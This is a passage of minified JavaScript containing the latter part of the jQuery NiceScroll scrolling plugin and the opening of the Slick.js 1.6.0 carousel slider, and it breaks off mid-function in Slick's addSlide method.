								var o = e.changedTouches[0];
								o.original = e, t.call(this, o)
							}
						}, r || !1)
					}
					v._bind(i, o, t, r || !1), x.cantouch && "mouseup" == o && v._bind(i, "touchcancel", t, r || !1)
				} else v._bind(i, o, function(e) {
					return e = e || window.event || !1, e && e.srcElement && (e.target = e.srcElement), "pageY" in e || (e.pageX = e.clientX + document.documentElement.scrollLeft, e.pageY = e.clientY + document.documentElement.scrollTop), t.call(i, e) === !1 || r === !1 ? v.cancelEvent(e) : !0
				})
			}, x.haseventlistener ? (this._bind = function(e, o, t, r) {
				v.events.push({
					e: e,
					n: o,
					f: t,
					b: r,
					q: !1
				}), e.addEventListener(o, t, r || !1)
			}, this.cancelEvent = function(e) {
				if (!e) return !1;
				var e = e.original ? e.original : e;
				return e.preventDefault(), e.stopPropagation(), e.preventManipulation && e.preventManipulation(), !1
			}, this.stopPropagation = function(e) {
				if (!e) return !1;
				var e = e.original ? e.original : e;
				return e.stopPropagation(), !1
			}, this._unbind = function(e, o, t, r) {
				e.removeEventListener(o, t, r)
			}) : (this._bind = function(e, o, t, r) {
				v.events.push({
					e: e,
					n: o,
					f: t,
					b: r,
					q: !1
				}), e.attachEvent ? e.attachEvent("on" + o, t) : e["on" + o] = t
			}, this.cancelEvent = function(e) {
				var e = window.event || !1;
				return e ? (e.cancelBubble = !0, e.cancel = !0, e.returnValue = !1, !1) : !1
			}, this.stopPropagation = function(e) {
				var e = window.event || !1;
				return e ? (e.cancelBubble = !0, !1) : !1
			}, this._unbind = function(e, o, t, r) {
				e.detachEvent ? e.detachEvent("on" + o, t) : e["on" + o] = !1
			}), this.unbindAll = function() {
				for (var e = 0; e < v.events.length; e++) {
					var o = v.events[e];
					o.q ? o.e.unbind(o.n, o.f) : v._unbind(o.e, o.n, o.f, o.b)
				}
			}, this.showRail = function() {
				return 0 == v.page.maxh || !v.ispage && "none" == v.win.css("display") || (v.visibility = !0, v.rail.visibility = !0, v.rail.css("display", "block")), v
			}, this.showRailHr = function() {
				return v.railh ? (0 == v.page.maxw || !v.ispage && "none" == v.win.css("display") || (v.railh.visibility = !0, v.railh.css("display", "block")), v) : v
			}, this.hideRail = function() {
				return v.visibility = !1, v.rail.visibility = !1, v.rail.css("display", "none"), v
			}, this.hideRailHr = function() {
				return v.railh ? (v.railh.visibility = !1, v.railh.css("display", "none"), v) : v
			}, this.show = function() {
				return v.hidden = !1, v.railslocked = !1, v.showRail().showRailHr()
			}, this.hide = function() {
				return v.hidden = !0, v.railslocked = !0, v.hideRail().hideRailHr()
			}, this.toggle = function() {
				return v.hidden ? v.show() : v.hide()
			}, this.remove = function() {
				v.stop(), v.cursortimeout && clearTimeout(v.cursortimeout), v.debouncedelayed && clearTimeout(v.debouncedelayed), v.doZoomOut(), v.unbindAll(), x.isie9 && v.win[0].detachEvent("onpropertychange", v.onAttributeChange), v.observer !== !1 && v.observer.disconnect(), v.observerremover !== !1 && v.observerremover.disconnect(), v.observerbody !== !1 && v.observerbody.disconnect(), v.events = null, v.cursor && v.cursor.remove(), v.cursorh && v.cursorh.remove(), v.rail && v.rail.remove(), v.railh && v.railh.remove(), v.zoom && v.zoom.remove();
				for (var e = 0; e < v.saved.css.length; e++) {
					var o = v.saved.css[e];
					o[0].css(o[1], "undefined" == typeof o[2] ? "" : o[2])
				}
				v.saved = !1, v.me.data("__nicescroll", "");
				var t = a.nicescroll;
				t.each(function(e) {
					if (this && this.id === v.id) {
						delete t[e];
						for (var o = ++e; o < t.length; o++, e++) t[e] = t[o];
						t.length--, t.length && delete t[t.length]
					}
				});
				for (var r in v) v[r] = null, delete v[r];
				v = null
			}, this.scrollstart = function(e) {
				return this.onscrollstart = e, v
			}, this.scrollend = function(e) {
				return this.onscrollend = e, v
			}, this.scrollcancel = function(e) {
				return this.onscrollcancel = e, v
			}, this.zoomin = function(e) {
				return this.onzoomin = e, v
			}, this.zoomout = function(e) {
				return this.onzoomout = e, v
			}, this.isScrollable = function(e) {
				var o = e.target ? e.target : e;
				if ("OPTION" == o.nodeName) return !0;
				for (; o && 1 == o.nodeType && !/^BODY|HTML/.test(o.nodeName);) {
					var t = a(o),
						r = t.css("overflowY") || t.css("overflowX") || t.css("overflow") || "";
					if (/scroll|auto/.test(r)) return o.clientHeight != o.scrollHeight;
					o = o.parentNode ? o.parentNode : !1
				}
				return !1
			}, this.getViewport = function(e) {
				for (var o = e && e.parentNode ? e.parentNode : !1; o && 1 == o.nodeType && !/^BODY|HTML/.test(o.nodeName);) {
					var t = a(o);
					if (/fixed|absolute/.test(t.css("position"))) return t;
					var r = t.css("overflowY") || t.css("overflowX") || t.css("overflow") || "";
					if (/scroll|auto/.test(r) && o.clientHeight != o.scrollHeight) return t;
					if (t.getNiceScroll().length > 0) return t;
					o = o.parentNode ? o.parentNode : !1
				}
				return !1
			}, this.triggerScrollEnd = function() {
				if (v.onscrollend) {
					var e = v.getScrollLeft(),
						o = v.getScrollTop(),
						t = {
							type: "scrollend",
							current: {
								x: e,
								y: o
							},
							end: {
								x: e,
								y: o
							}
						};
					v.onscrollend.call(v, t)
				}
			}, this.onmousewheel = function(e) {
				if (!v.wheelprevented) {
					if (v.railslocked) return v.debounced("checkunlock", v.resize, 250), !0;
					if (v.rail.drag) return v.cancelEvent(e);
					if ("auto" == v.opt.oneaxismousemode && 0 != e.deltaX && (v.opt.oneaxismousemode = !1), v.opt.oneaxismousemode && 0 == e.deltaX && !v.rail.scrollable) return v.railh && v.railh.scrollable ? v.onmousewheelhr(e) : !0;
					var o = +new Date,
						t = !1;
					if (v.opt.preservenativescrolling && v.checkarea + 600 < o && (v.nativescrollingarea = v.isScrollable(e), t = !0), v.checkarea = o, v.nativescrollingarea) return !0;
					var r = g(e, !1, t);
					return r && (v.checkarea = 0), r
				}
			}, this.onmousewheelhr = function(e) {
				if (!v.wheelprevented) {
					if (v.railslocked || !v.railh.scrollable) return !0;
					if (v.rail.drag) return v.cancelEvent(e);
					var o = +new Date,
						t = !1;
					return v.opt.preservenativescrolling && v.checkarea + 600 < o && (v.nativescrollingarea = v.isScrollable(e), t = !0), v.checkarea = o, v.nativescrollingarea ? !0 : v.railslocked ? v.cancelEvent(e) : g(e, !0, t)
				}
			}, this.stop = function() {
				return v.cancelScroll(), v.scrollmon && v.scrollmon.stop(), v.cursorfreezed = !1, v.scroll.y = Math.round(v.getScrollTop() * (1 / v.scrollratio.y)), v.noticeCursor(), v
			}, this.getTransitionSpeed = function(e) {
				var o = Math.round(10 * v.opt.scrollspeed),
					t = Math.min(o, Math.round(e / 20 * v.opt.scrollspeed));
				return t > 20 ? t : 0
			}, v.opt.smoothscroll ? v.ishwscroll && x.hastransition && v.opt.usetransition && v.opt.smoothscroll ? (this.prepareTransition = function(e, o) {
				var t = o ? e > 20 ? e : 0 : v.getTransitionSpeed(e),
					r = t ? x.prefixstyle + "transform " + t + "ms ease-out" : "";
				return v.lasttransitionstyle && v.lasttransitionstyle == r || (v.lasttransitionstyle = r, v.doc.css(x.transitionstyle, r)), t
			}, this.doScrollLeft = function(e, o) {
				var t = v.scrollrunning ? v.newscrolly : v.getScrollTop();
				v.doScrollPos(e, t, o)
			}, this.doScrollTop = function(e, o) {
				var t = v.scrollrunning ? v.newscrollx : v.getScrollLeft();
				v.doScrollPos(t, e, o)
			}, this.doScrollPos = function(e, o, t) {
				var r = v.getScrollTop(),
					i = v.getScrollLeft();
				return ((v.newscrolly - r) * (o - r) < 0 || (v.newscrollx - i) * (e - i) < 0) && v.cancelScroll(), 0 == v.opt.bouncescroll && (0 > o ? o = 0 : o > v.page.maxh && (o = v.page.maxh), 0 > e ? e = 0 : e > v.page.maxw && (e = v.page.maxw)), v.scrollrunning && e == v.newscrollx && o == v.newscrolly ? !1 : (v.newscrolly = o, v.newscrollx = e, v.newscrollspeed = t || !1, v.timer ? !1 : void(v.timer = setTimeout(function() {
					var t = v.getScrollTop(),
						r = v.getScrollLeft(),
						i = {};
					i.x = e - r, i.y = o - t, i.px = r, i.py = t;
					var n = Math.round(Math.sqrt(Math.pow(i.x, 2) + Math.pow(i.y, 2))),
						s = v.newscrollspeed && v.newscrollspeed > 1 ? v.newscrollspeed : v.getTransitionSpeed(n);
					if (v.newscrollspeed && v.newscrollspeed <= 1 && (s *= v.newscrollspeed), v.prepareTransition(s, !0), v.timerscroll && v.timerscroll.tm && clearInterval(v.timerscroll.tm), s > 0) {
						if (!v.scrollrunning && v.onscrollstart) {
							var l = {
								type: "scrollstart",
								current: {
									x: r,
									y: t
								},
								request: {
									x: e,
									y: o
								},
								end: {
									x: v.newscrollx,
									y: v.newscrolly
								},
								speed: s
							};
							v.onscrollstart.call(v, l)
						}
						x.transitionend ? v.scrollendtrapped || (v.scrollendtrapped = !0, v.bind(v.doc, x.transitionend, v.onScrollTransitionEnd, !1)) : (v.scrollendtrapped && clearTimeout(v.scrollendtrapped), v.scrollendtrapped = setTimeout(v.onScrollTransitionEnd, s));
						var a = t,
							c = r;
						v.timerscroll = {
							bz: new z(a, v.newscrolly, s, 0, 0, .58, 1),
							bh: new z(c, v.newscrollx, s, 0, 0, .58, 1)
						}, v.cursorfreezed || (v.timerscroll.tm = setInterval(function() {
							v.showCursor(v.getScrollTop(), v.getScrollLeft())
						}, 60))
					}
					v.synched("doScroll-set", function() {
						v.timer = 0, v.scrollendtrapped && (v.scrollrunning = !0), v.setScrollTop(v.newscrolly), v.setScrollLeft(v.newscrollx), v.scrollendtrapped || v.onScrollTransitionEnd()
					})
				}, 50)))
			}, this.cancelScroll = function() {
				if (!v.scrollendtrapped) return !0;
				var e = v.getScrollTop(),
					o = v.getScrollLeft();
				return v.scrollrunning = !1, x.transitionend || clearTimeout(x.transitionend), v.scrollendtrapped = !1, v._unbind(v.doc[0], x.transitionend, v.onScrollTransitionEnd), v.prepareTransition(0), v.setScrollTop(e), v.railh && v.setScrollLeft(o), v.timerscroll && v.timerscroll.tm && clearInterval(v.timerscroll.tm), v.timerscroll = !1, v.cursorfreezed = !1, v.showCursor(e, o), v
			}, this.onScrollTransitionEnd = function() {
				v.scrollendtrapped && v._unbind(v.doc[0], x.transitionend, v.onScrollTransitionEnd), v.scrollendtrapped = !1, v.prepareTransition(0), v.timerscroll && v.timerscroll.tm && clearInterval(v.timerscroll.tm), v.timerscroll = !1;
				var e = v.getScrollTop(),
					o = v.getScrollLeft();
				return v.setScrollTop(e), v.railh && v.setScrollLeft(o), v.noticeCursor(!1, e, o), v.cursorfreezed = !1, 0 > e ? e = 0 : e > v.page.maxh && (e = v.page.maxh), 0 > o ? o = 0 : o > v.page.maxw && (o = v.page.maxw), e != v.newscrolly || o != v.newscrollx ? v.doScrollPos(o, e, v.opt.snapbackspeed) : (v.onscrollend && v.scrollrunning && v.triggerScrollEnd(), void(v.scrollrunning = !1))
			}) : (this.doScrollLeft = function(e, o) {
				var t = v.scrollrunning ? v.newscrolly : v.getScrollTop();
				v.doScrollPos(e, t, o)
			}, this.doScrollTop = function(e, o) {
				var t = v.scrollrunning ? v.newscrollx : v.getScrollLeft();
				v.doScrollPos(t, e, o)
			}, this.doScrollPos = function(e, o, t) {
				function r() {
					if (v.cancelAnimationFrame) return !0;
					if (v.scrollrunning = !0, h = 1 - h) return v.timer = d(r) || 1;
					var e, o, t = 0,
						i = o = v.getScrollTop();
					if (v.dst.ay) {
						i = v.bzscroll ? v.dst.py + v.bzscroll.getNow() * v.dst.ay : v.newscrolly;
						var n = i - o;
						(0 > n && i < v.newscrolly || n > 0 && i > v.newscrolly) && (i = v.newscrolly), v.setScrollTop(i), i == v.newscrolly && (t = 1)
					} else t = 1;
					var s = e = v.getScrollLeft();
					if (v.dst.ax) {
						s = v.bzscroll ? v.dst.px + v.bzscroll.getNow() * v.dst.ax : v.newscrollx;
						var n = s - e;
						(0 > n && s < v.newscrollx || n > 0 && s > v.newscrollx) && (s = v.newscrollx), v.setScrollLeft(s), s == v.newscrollx && (t += 1)
					} else t += 1;
					2 == t ? (v.timer = 0, v.cursorfreezed = !1, v.bzscroll = !1, v.scrollrunning = !1, 0 > i ? i = 0 : i > v.page.maxh && (i = v.page.maxh), 0 > s ? s = 0 : s > v.page.maxw && (s = v.page.maxw), s != v.newscrollx || i != v.newscrolly ? v.doScrollPos(s, i) : v.onscrollend && v.triggerScrollEnd()) : v.timer = d(r) || 1
				}
				var o = "undefined" == typeof o || o === !1 ? v.getScrollTop(!0) : o;
				if (v.timer && v.newscrolly == o && v.newscrollx == e) return !0;
				v.timer && u(v.timer), v.timer = 0;
				var i = v.getScrollTop(),
					n = v.getScrollLeft();
				((v.newscrolly - i) * (o - i) < 0 || (v.newscrollx - n) * (e - n) < 0) && v.cancelScroll(), v.newscrolly = o, v.newscrollx = e, v.bouncescroll && v.rail.visibility || (v.newscrolly < 0 ? v.newscrolly = 0 : v.newscrolly > v.page.maxh && (v.newscrolly = v.page.maxh)), v.bouncescroll && v.railh.visibility || (v.newscrollx < 0 ? v.newscrollx = 0 : v.newscrollx > v.page.maxw && (v.newscrollx = v.page.maxw)), v.dst = {}, v.dst.x = e - n, v.dst.y = o - i, v.dst.px = n, v.dst.py = i;
				var s = Math.round(Math.sqrt(Math.pow(v.dst.x, 2) + Math.pow(v.dst.y, 2)));
				v.dst.ax = v.dst.x / s, v.dst.ay = v.dst.y / s;
				var l = 0,
					a = s;
				0 == v.dst.x ? (l = i, a = o, v.dst.ay = 1, v.dst.py = 0) : 0 == v.dst.y && (l = n, a = e, v.dst.ax = 1, v.dst.px = 0);
				var c = v.getTransitionSpeed(s);
				if (t && 1 >= t && (c *= t), c > 0 ? v.bzscroll = v.bzscroll ? v.bzscroll.update(a, c) : new z(l, a, c, 0, 1, 0, 1) : v.bzscroll = !1, !v.timer) {
					(i == v.page.maxh && o >= v.page.maxh || n == v.page.maxw && e >= v.page.maxw) && v.checkContentSize();
					var h = 1;
					if (v.cancelAnimationFrame = !1, v.timer = 1, v.onscrollstart && !v.scrollrunning) {
						var p = {
							type: "scrollstart",
							current: {
								x: n,
								y: i
							},
							request: {
								x: e,
								y: o
							},
							end: {
								x: v.newscrollx,
								y: v.newscrolly
							},
							speed: c
						};
						v.onscrollstart.call(v, p)
					}
					r(), (i == v.page.maxh && o >= i || n == v.page.maxw && e >= n) && v.checkContentSize(), v.noticeCursor()
				}
			}, this.cancelScroll = function() {
				return v.timer && u(v.timer), v.timer = 0, v.bzscroll = !1, v.scrollrunning = !1, v
			}) : (this.doScrollLeft = function(e, o) {
				var t = v.getScrollTop();
				v.doScrollPos(e, t, o)
			}, this.doScrollTop = function(e, o) {
				var t = v.getScrollLeft();
				v.doScrollPos(t, e, o)
			}, this.doScrollPos = function(e, o, t) {
				var r = e > v.page.maxw ? v.page.maxw : e;
				0 > r && (r = 0);
				var i = o > v.page.maxh ? v.page.maxh : o;
				0 > i && (i = 0), v.synched("scroll", function() {
					v.setScrollTop(i), v.setScrollLeft(r)
				})
			}, this.cancelScroll = function() {}), this.doScrollBy = function(e, o) {
				var t = 0;
				if (o) t = Math.floor((v.scroll.y - e) * v.scrollratio.y);
				else {
					var r = v.timer ? v.newscrolly : v.getScrollTop(!0);
					t = r - e
				}
				if (v.bouncescroll) {
					var i = Math.round(v.view.h / 2); - i > t ? t = -i : t > v.page.maxh + i && (t = v.page.maxh + i)
				}
				v.cursorfreezed = !1;
				var n = v.getScrollTop(!0);
				return 0 > t && 0 >= n ? v.noticeCursor() : t > v.page.maxh && n >= v.page.maxh ? (v.checkContentSize(), v.noticeCursor()) : void v.doScrollTop(t)
			}, this.doScrollLeftBy = function(e, o) {
				var t = 0;
				if (o) t = Math.floor((v.scroll.x - e) * v.scrollratio.x);
				else {
					var r = v.timer ? v.newscrollx : v.getScrollLeft(!0);
					t = r - e
				}
				if (v.bouncescroll) {
					var i = Math.round(v.view.w / 2); - i > t ? t = -i : t > v.page.maxw + i && (t = v.page.maxw + i)
				}
				v.cursorfreezed = !1;
				var n = v.getScrollLeft(!0);
				return 0 > t && 0 >= n ? v.noticeCursor() : t > v.page.maxw && n >= v.page.maxw ? v.noticeCursor() : void v.doScrollLeft(t)
			}, this.doScrollTo = function(e, o) {
				var t = o ? Math.round(e * v.scrollratio.y) : e;
				0 > t ? t = 0 : t > v.page.maxh && (t = v.page.maxh), v.cursorfreezed = !1, v.doScrollTop(e)
			}, this.checkContentSize = function() {
				var e = v.getContentSize();
				(e.h != v.page.h || e.w != v.page.w) && v.resize(!1, e)
			}, v.onscroll = function(e) {
				v.rail.drag || v.cursorfreezed || v.synched("scroll", function() {
					v.scroll.y = Math.round(v.getScrollTop() * (1 / v.scrollratio.y)), v.railh && (v.scroll.x = Math.round(v.getScrollLeft() * (1 / v.scrollratio.x))), v.noticeCursor()
				})
			}, v.bind(v.docscroll, "scroll", v.onscroll), this.doZoomIn = function(e) {
				if (!v.zoomactive) {
					v.zoomactive = !0, v.zoomrestore = {
						style: {}
					};
					var o = ["position", "top", "left", "zIndex", "backgroundColor", "marginTop", "marginBottom", "marginLeft", "marginRight"],
						t = v.win[0].style;
					for (var r in o) {
						var i = o[r];
						v.zoomrestore.style[i] = "undefined" != typeof t[i] ? t[i] : ""
					}
					v.zoomrestore.style.width = v.win.css("width"), v.zoomrestore.style.height = v.win.css("height"), v.zoomrestore.padding = {
						w: v.win.outerWidth() - v.win.width(),
						h: v.win.outerHeight() - v.win.height()
					}, x.isios4 && (v.zoomrestore.scrollTop = a(window).scrollTop(), a(window).scrollTop(0)), v.win.css({
						position: x.isios4 ? "absolute" : "fixed",
						top: 0,
						left: 0,
						"z-index": l + 100,
						margin: "0px"
					});
					var n = v.win.css("backgroundColor");
					return ("" == n || /transparent|rgba\(0, 0, 0, 0\)|rgba\(0,0,0,0\)/.test(n)) && v.win.css("backgroundColor", "#fff"), v.rail.css({
						"z-index": l + 101
					}), v.zoom.css({
						"z-index": l + 102
					}), v.zoom.css("backgroundPosition", "0px -18px"), v.resizeZoom(), v.onzoomin && v.onzoomin.call(v), v.cancelEvent(e)
				}
			}, this.doZoomOut = function(e) {
				return v.zoomactive ? (v.zoomactive = !1, v.win.css("margin", ""), v.win.css(v.zoomrestore.style), x.isios4 && a(window).scrollTop(v.zoomrestore.scrollTop), v.rail.css({
					"z-index": v.zindex
				}), v.zoom.css({
					"z-index": v.zindex
				}), v.zoomrestore = !1, v.zoom.css("backgroundPosition", "0px 0px"), v.onResize(), v.onzoomout && v.onzoomout.call(v), v.cancelEvent(e)) : void 0
			}, this.doZoom = function(e) {
				return v.zoomactive ? v.doZoomOut(e) : v.doZoomIn(e)
			}, this.resizeZoom = function() {
				if (v.zoomactive) {
					var e = v.getScrollTop();
					v.win.css({
						width: a(window).width() - v.zoomrestore.padding.w + "px",
						height: a(window).height() - v.zoomrestore.padding.h + "px"
					}), v.onResize(), v.setScrollTop(Math.min(v.page.maxh, e))
				}
			}, this.init(), a.nicescroll.push(this)
		},
		b = function(e) {
			var o = this;
			this.nc = e, this.lastx = 0, this.lasty = 0, this.speedx = 0, this.speedy = 0, this.lasttime = 0, this.steptime = 0, this.snapx = !1, this.snapy = !1, this.demulx = 0, this.demuly = 0, this.lastscrollx = -1, this.lastscrolly = -1, this.chkx = 0, this.chky = 0, this.timer = 0, this.time = function() {
				return +new Date
			}, this.reset = function(e, t) {
				o.stop();
				var r = o.time();
				o.steptime = 0, o.lasttime = r, o.speedx = 0, o.speedy = 0, o.lastx = e, o.lasty = t, o.lastscrollx = -1, o.lastscrolly = -1
			}, this.update = function(e, t) {
				var r = o.time();
				o.steptime = r - o.lasttime, o.lasttime = r;
				var i = t - o.lasty,
					n = e - o.lastx,
					s = o.nc.getScrollTop(),
					l = o.nc.getScrollLeft(),
					a = s + i,
					c = l + n;
				o.snapx = 0 > c || c > o.nc.page.maxw, o.snapy = 0 > a || a > o.nc.page.maxh, o.speedx = n, o.speedy = i, o.lastx = e, o.lasty = t
			}, this.stop = function() {
				o.nc.unsynched("domomentum2d"), o.timer && clearTimeout(o.timer), o.timer = 0, o.lastscrollx = -1, o.lastscrolly = -1
			}, this.doSnapy = function(e, t) {
				var r = !1;
				0 > t ? (t = 0, r = !0) : t > o.nc.page.maxh && (t = o.nc.page.maxh, r = !0), 0 > e ? (e = 0, r = !0) : e > o.nc.page.maxw && (e = o.nc.page.maxw, r = !0), r ? o.nc.doScrollPos(e, t, o.nc.opt.snapbackspeed) : o.nc.triggerScrollEnd()
			}, this.doMomentum = function(e) {
				var t = o.time(),
					r = e ? t + e : o.lasttime,
					i = o.nc.getScrollLeft(),
					n = o.nc.getScrollTop(),
					s = o.nc.page.maxh,
					l = o.nc.page.maxw;
				o.speedx = l > 0 ? Math.min(60, o.speedx) : 0, o.speedy = s > 0 ? Math.min(60, o.speedy) : 0;
				var a = r && 60 >= t - r;
				(0 > n || n > s || 0 > i || i > l) && (a = !1);
				var c = o.speedy && a ? o.speedy : !1,
					d = o.speedx && a ? o.speedx : !1;
				if (c || d) {
					var u = Math.max(16, o.steptime);
					if (u > 50) {
						var h = u / 50;
						o.speedx *= h, o.speedy *= h, u = 50
					}
					o.demulxy = 0, o.lastscrollx = o.nc.getScrollLeft(), o.chkx = o.lastscrollx, o.lastscrolly = o.nc.getScrollTop(), o.chky = o.lastscrolly;
					var p = o.lastscrollx,
						m = o.lastscrolly,
						f = function() {
							var e = o.time() - t > 600 ? .04 : .02;
							o.speedx && (p = Math.floor(o.lastscrollx - o.speedx * (1 - o.demulxy)), o.lastscrollx = p, (0 > p || p > l) && (e = .1)), o.speedy && (m = Math.floor(o.lastscrolly - o.speedy * (1 - o.demulxy)), o.lastscrolly = m, (0 > m || m > s) && (e = .1)), o.demulxy = Math.min(1, o.demulxy + e), o.nc.synched("domomentum2d", function() {
								if (o.speedx) {
									var e = o.nc.getScrollLeft();
									e != o.chkx && o.stop(), o.chkx = p, o.nc.setScrollLeft(p)
								}
								if (o.speedy) {
									var t = o.nc.getScrollTop();
									t != o.chky && o.stop(), o.chky = m, o.nc.setScrollTop(m)
								}
								o.timer || (o.nc.hideCursor(), o.doSnapy(p, m))
							}), o.demulxy < 1 ? o.timer = setTimeout(f, u) : (o.stop(), o.nc.hideCursor(), o.doSnapy(p, m))
						};
					f()
				} else o.doSnapy(o.nc.getScrollLeft(), o.nc.getScrollTop())
			}
		},
		y = e.fn.scrollTop;
	e.cssHooks.pageYOffset = {
		get: function(e, o, t) {
			var r = a.data(e, "__nicescroll") || !1;
			return r && r.ishwscroll ? r.getScrollTop() : y.call(e)
		},
		set: function(e, o) {
			var t = a.data(e, "__nicescroll") || !1;
			return t && t.ishwscroll ? t.setScrollTop(parseInt(o)) : y.call(e, o), this
		}
	}, e.fn.scrollTop = function(e) {
		if ("undefined" == typeof e) {
			var o = this[0] ? a.data(this[0], "__nicescroll") || !1 : !1;
			return o && o.ishwscroll ? o.getScrollTop() : y.call(this)
		}
		return this.each(function() {
			var o = a.data(this, "__nicescroll") || !1;
			o && o.ishwscroll ? o.setScrollTop(parseInt(e)) : y.call(a(this), e)
		})
	};
	var x = e.fn.scrollLeft;
	a.cssHooks.pageXOffset = {
		get: function(e, o, t) {
			var r = a.data(e, "__nicescroll") || !1;
			return r && r.ishwscroll ? r.getScrollLeft() : x.call(e)
		},
		set: function(e, o) {
			var t = a.data(e, "__nicescroll") || !1;
			return t && t.ishwscroll ? t.setScrollLeft(parseInt(o)) : x.call(e, o), this
		}
	}, e.fn.scrollLeft = function(e) {
		if ("undefined" == typeof e) {
			var o = this[0] ? a.data(this[0], "__nicescroll") || !1 : !1;
			return o && o.ishwscroll ? o.getScrollLeft() : x.call(this)
		}
		return this.each(function() {
			var o = a.data(this, "__nicescroll") || !1;
			o && o.ishwscroll ? o.setScrollLeft(parseInt(e)) : x.call(a(this), e)
		})
	};
	var S = function(e) {
		var o = this;
		if (this.length = 0, this.name = "nicescrollarray", this.each = function(e) {
				for (var t = 0, r = 0; t < o.length; t++) e.call(o[t], r++);
				return o
			}, this.push = function(e) {
				o[o.length] = e, o.length++
			}, this.eq = function(e) {
				return o[e]
			}, e)
			for (var t = 0; t < e.length; t++) {
				var r = a.data(e[t], "__nicescroll") || !1;
				r && (this[this.length] = r, this.length++)
			}
		return this
	};
	t(S.prototype, ["show", "hide", "toggle", "onResize", "resize", "remove", "stop", "doScrollPos"], function(e, o) {
		e[o] = function() {
			var e = arguments;
			return this.each(function() {
				this[o].apply(this, e)
			})
		}
	}), e.fn.getNiceScroll = function(e) {
		if ("undefined" == typeof e) return new S(this);
		var o = this[e] && a.data(this[e], "__nicescroll") || !1;
		return o
	}, e.extend(e.expr[":"], {
		nicescroll: function(e) {
			return a.data(e, "__nicescroll") ? !0 : !1
		}
	}), a.fn.niceScroll = function(e, o) {
		"undefined" == typeof o && ("object" != typeof e || "jquery" in e || (o = e, e = !1)), o = a.extend({}, o);
		var t = new S;
		"undefined" == typeof o && (o = {}), e && (o.doc = a(e), o.win = a(this));
		var r = !("doc" in o);
		return r || "win" in o || (o.win = a(this)), this.each(function() {
			var e = a(this).data("__nicescroll") || !1;
			e || (o.doc = r ? a(this) : o.doc, e = new v(o, a(this)), a(this).data("__nicescroll", e)), t.push(e)
		}), 1 == t.length ? t[0] : t
	}, window.NiceScroll = {
		getjQuery: function() {
			return e
		}
	}, a.nicescroll || (a.nicescroll = new S, a.nicescroll.options = f)
});


/**
 * Slider
 * 
 * Slick.js
 * 
 * 1.6.0 | Ken Wheeler | http://kenwheeler.github.io | MIT license
 */
! function(a) {
	"function" == typeof define && define.amd ? define(["jquery"], a) : "undefined" != typeof exports ? module.exports = a(require("jquery")) : a(jQuery)
}(function(a) {
	"use strict";
	var b = window.Slick || {};
	b = function() {
		function c(c, d) {
			var f, e = this;
			e.defaults = {
				accessibility: !0,
				adaptiveHeight: !1,
				appendArrows: a(c),
				appendDots: a(c),
				arrows: !0,
				asNavFor: null,
				prevArrow: '<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',
				nextArrow: '<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',
				autoplay: !1,
				autoplaySpeed: 3e3,
				centerMode: !1,
				centerPadding: "50px",
				cssEase: "ease",
				customPaging: function(b, c) {
					return a('<button type="button" data-role="none" role="button" tabindex="0" />').text(c + 1)
				},
				dots: !1,
				dotsClass: "slick-dots",
				draggable: !0,
				easing: "linear",
				edgeFriction: .35,
				fade: !1,
				focusOnSelect: !1,
				infinite: !0,
				initialSlide: 0,
				lazyLoad: "ondemand",
				mobileFirst: !1,
				pauseOnHover: !0,
				pauseOnFocus: !0,
				pauseOnDotsHover: !1,
				respondTo: "window",
				responsive: null,
				rows: 1,
				rtl: !1,
				slide: "",
				slidesPerRow: 1,
				slidesToShow: 1,
				slidesToScroll: 1,
				speed: 500,
				swipe: !0,
				swipeToSlide: !1,
				touchMove: !0,
				touchThreshold: 5,
				useCSS: !0,
				useTransform: !0,
				variableWidth: !1,
				vertical: !1,
				verticalSwiping: !1,
				waitForAnimate: !0,
				zIndex: 1e3
			}, e.initials = {
				animating: !1,
				dragging: !1,
				autoPlayTimer: null,
				currentDirection: 0,
				currentLeft: null,
				currentSlide: 0,
				direction: 1,
				$dots: null,
				listWidth: null,
				listHeight: null,
				loadIndex: 0,
				$nextArrow: null,
				$prevArrow: null,
				slideCount: null,
				slideWidth: null,
				$slideTrack: null,
				$slides: null,
				sliding: !1,
				slideOffset: 0,
				swipeLeft: null,
				$list: null,
				touchObject: {},
				transformsEnabled: !1,
				unslicked: !1
			}, a.extend(e, e.initials), e.activeBreakpoint = null, e.animType = null, e.animProp = null, e.breakpoints = [], e.breakpointSettings = [], e.cssTransitions = !1, e.focussed = !1, e.interrupted = !1, e.hidden = "hidden", e.paused = !0, e.positionProp = null, e.respondTo = null, e.rowCount = 1, e.shouldClick = !0, e.$slider = a(c), e.$slidesCache = null, e.transformType = null, e.transitionType = null, e.visibilityChange = "visibilitychange", e.windowWidth = 0, e.windowTimer = null, f = a(c).data("slick") || {}, e.options = a.extend({}, e.defaults, d, f), e.currentSlide = e.options.initialSlide, e.originalSettings = e.options, "undefined" != typeof document.mozHidden ? (e.hidden = "mozHidden", e.visibilityChange = "mozvisibilitychange") : "undefined" != typeof document.webkitHidden && (e.hidden = "webkitHidden", e.visibilityChange = "webkitvisibilitychange"), e.autoPlay = a.proxy(e.autoPlay, e), e.autoPlayClear = a.proxy(e.autoPlayClear, e), e.autoPlayIterator = a.proxy(e.autoPlayIterator, e), e.changeSlide = a.proxy(e.changeSlide, e), e.clickHandler = a.proxy(e.clickHandler, e), e.selectHandler = a.proxy(e.selectHandler, e), e.setPosition = a.proxy(e.setPosition, e), e.swipeHandler = a.proxy(e.swipeHandler, e), e.dragHandler = a.proxy(e.dragHandler, e), e.keyHandler = a.proxy(e.keyHandler, e), e.instanceUid = b++, e.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, e.registerBreakpoints(), e.init(!0)
		}
		var b = 0;
		return c
	}(), b.prototype.activateADA = function() {
		var a = this;
		a.$slideTrack.find(".slick-active").attr({
			"aria-hidden": "false"
		}).find("a, input, button, select").attr({
			tabindex: "0"
		})
	}, b.prototype.addSlide = b.prototype.slickAdd = function(b, c, d) {
		var e = this;
		if ("boolean" == typeof c) d = c, c = null;
		else if (0 > c || c >= e.slideCount) return !1;
		e.unload(), "number" == typeof c ? 0 === c && 0 === e.$slides.length ? a(b).appendTo(e.$slideTrack) : d ? a(b).insertBefore(e.$slides.eq(c)) : a(b).insertAfter(e.$slides.eq(c)) : d === !0 ? a(b).prependTo(e.$slideTrack) : a(b).appendTo(e.$slideTrack), e.$slides = e.$slideTrack.children(this.options.slide), e.$slideTrack.children(this.options.slide).detach(), e.$slideTrack.append(e.$slides), e.$slides.each(function(b, c) {
